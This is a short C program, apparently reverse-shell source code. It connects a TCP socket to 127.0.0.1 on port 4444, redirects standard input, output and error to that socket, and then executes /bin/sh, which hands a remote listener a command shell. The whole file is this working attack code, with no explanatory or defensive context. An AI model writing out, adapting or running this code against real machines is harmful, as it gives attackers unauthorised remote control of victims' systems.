#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main() {
    int sock_fd;
    struct sockaddr_in sock_addr;
    
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(4444);
    inet_pton(AF_INET, "127.0.0.1", &sock_addr.sin_addr);
    
    sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    connect(sock_fd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
    
    dup2(sock_fd, 0);
    dup2(sock_fd, 1);
    dup2(sock_fd, 2);
    execve("/bin/sh", NULL, NULL);
}
